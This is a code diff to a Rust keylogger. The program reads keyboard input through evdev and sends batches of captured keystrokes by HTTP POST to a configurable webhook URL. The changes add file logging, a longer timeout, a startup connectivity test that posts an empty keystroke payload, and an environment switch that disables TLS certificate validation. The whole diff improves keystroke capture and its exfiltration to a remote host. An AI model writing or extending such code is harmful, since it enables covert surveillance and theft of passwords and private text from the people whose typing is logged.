@@ -2,6 +2,7 @@ use evdev::{Device, EventType, InputEventKind, Key};
 use std::fs::OpenOptions;
 use std::io::Write;
 use std::os::unix::io::AsRawFd;
+use std::env;
 use chrono::Local;
 use nix::fcntl::{FcntlArg, OFlag};
 use nix::sys::epoll::{self, EpollEvent, EpollFlags, EpollOp};
@@ -116,18 +117,74 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
     let webhook_sender = webhook_url.map(|url| {
         let (tx, rx) = mpsc::sync_channel::<KeystrokeData>(100); // Buffer up to 100 keystrokes
         
+        // Clone log path for use in webhook thread
+        let log_path_clone = log_path.to_string();
+        
         // Spawn worker thread to handle webhook requests
         thread::spawn(move || {
+            // Helper to log to file
+            let log_to_file = |msg: &str| {
+                if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&log_path_clone) {
+                    let _ = writeln!(f, "[{}] WEBHOOK: {}", Local::now().format("%Y-%m-%d %H:%M:%S"), msg);
+                    let _ = f.flush();
+                }
+            };
+            
+            log_to_file(&format!("Initializing webhook client for URL: {}", url));
+            
+            // Check if user wants to accept invalid certificates (for testing services)
+            // Set RUST_KEY_ACCEPT_INVALID_CERTS=true to accept self-signed certificates (less secure)
+            let accept_invalid_certs = env::var("RUST_KEY_ACCEPT_INVALID_CERTS")
+                .unwrap_or_else(|_| "false".to_string())
+                .to_lowercase() == "true";
+            
+            if accept_invalid_certs {
+                log_to_file("⚠️  WARNING: Certificate validation is DISABLED (insecure mode)");
+                log_to_file("⚠️  This makes the connection vulnerable to man-in-the-middle attacks");
+                log_to_file("⚠️  Only use this for testing with self-signed certificates");
+            } else {
+                log_to_file("Certificate validation is enabled (secure mode - default)");
+            }
+            
             // Create HTTP client once
             let client = match reqwest::blocking::Client::builder()
-                .timeout(std::time::Duration::from_secs(5))
+                .timeout(std::time::Duration::from_secs(10))  // Increased from 5s to 10s
+                .danger_accept_invalid_certs(accept_invalid_certs)
                 .build() {
-                Ok(c) => c,
+                Ok(c) => {
+                    log_to_file("HTTP client created successfully");
+                    c
+                }
                 Err(e) => {
-                    eprintln!("Failed to create HTTP client: {}", e);
+                    let error_msg = format!("Failed to create HTTP client: {}", e);
+                    eprintln!("{}", error_msg);
+                    log_to_file(&error_msg);
+                    log_to_file("Webhook functionality will be disabled");
                     return;
                 }
             };
+            
+            // Test initial connectivity with a minimal POST request
+            // This tests the same method that will be used for actual data transmission
+            log_to_file("Testing initial connectivity to webhook...");
+            let test_payload = json!({
+                "keystrokes": []
+            });
+            match client.post(&url).json(&test_payload).send() {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    log_to_file(&format!("Initial connectivity test successful (HTTP {})", status));
+                    if status >= 400 {
+                        log_to_file(&format!("⚠️  Warning: Webhook returned error status {}. Check webhook configuration.", status));
+                    }
+                }
+                Err(e) => {
+                    log_to_file(&format!("Initial connectivity test failed: {}", e));
+                    log_to_file("Will continue anyway - keystroke batches will be sent as they accumulate");
+                    eprintln!("Warning: Initial webhook connectivity test failed: {}", e);
+                    eprintln!("Continuing anyway - keystroke batches will be sent as they accumulate");
+                }
+            }
             
             const BATCH_SIZE: usize = 20; // Send in batches of 20 keystrokes
             const BATCH_TIMEOUT_MS: u64 = 2000; // Or send after 2 seconds
@@ -164,11 +221,20 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                             let payload = create_payload(&batch);
                             
                             match client.post(&url).json(&payload).send() {
-                                Ok(_) => {
-                                    // Successfully sent batch
+                                Ok(resp) => {
+                                    let status = resp.status().as_u16();
+                                    if status >= 200 && status < 300 {
+                                        log_to_file(&format!("Successfully sent batch of {} keystrokes (HTTP {})", batch.len(), status));
+                                    } else {
+                                        let error_msg = format!("Webhook returned non-success status: HTTP {} for batch of {} keystrokes", status, batch.len());
+                                        eprintln!("{}", error_msg);
+                                        log_to_file(&error_msg);
+                                    }
                                 }
                                 Err(e) => {
-                                    eprintln!("Failed to send batch to webhook: {}", e);
+                                    let error_msg = format!("Failed to send batch to webhook: {}", e);
+                                    eprintln!("{}", error_msg);
+                                    log_to_file(&error_msg);
                                 }
                             }
                             
@@ -182,11 +248,20 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                             let payload = create_payload(&batch);
                             
                             match client.post(&url).json(&payload).send() {
-                                Ok(_) => {
-                                    // Successfully sent batch
+                                Ok(resp) => {
+                                    let status = resp.status().as_u16();
+                                    if status >= 200 && status < 300 {
+                                        log_to_file(&format!("Successfully sent batch of {} keystrokes (HTTP {}) [timeout]", batch.len(), status));
+                                    } else {
+                                        let error_msg = format!("Webhook returned non-success status: HTTP {} for batch of {} keystrokes [timeout]", status, batch.len());
+                                        eprintln!("{}", error_msg);
+                                        log_to_file(&error_msg);
+                                    }
                                 }
                                 Err(e) => {
-                                    eprintln!("Failed to send batch to webhook: {}", e);
+                                    let error_msg = format!("Failed to send batch to webhook [timeout]: {}", e);
+                                    eprintln!("{}", error_msg);
+                                    log_to_file(&error_msg);
                                 }
                             }
                             
@@ -198,8 +273,18 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                         // Channel closed, send any remaining data
                         if !batch.is_empty() {
                             let payload = create_payload(&batch);
-                            let _ = client.post(&url).json(&payload).send();
+                            match client.post(&url).json(&payload).send() {
+                                Ok(_) => {
+                                    log_to_file(&format!("Sent final batch of {} keystrokes on shutdown", batch.len()));
+                                }
+                                Err(e) => {
+                                    let error_msg = format!("Failed to send final batch on shutdown: {}", e);
+                                    eprintln!("{}", error_msg);
+                                    log_to_file(&error_msg);
+                                }
+                            }
                         }
+                        log_to_file("Webhook thread shutting down");
                         break;
                     }
                 }
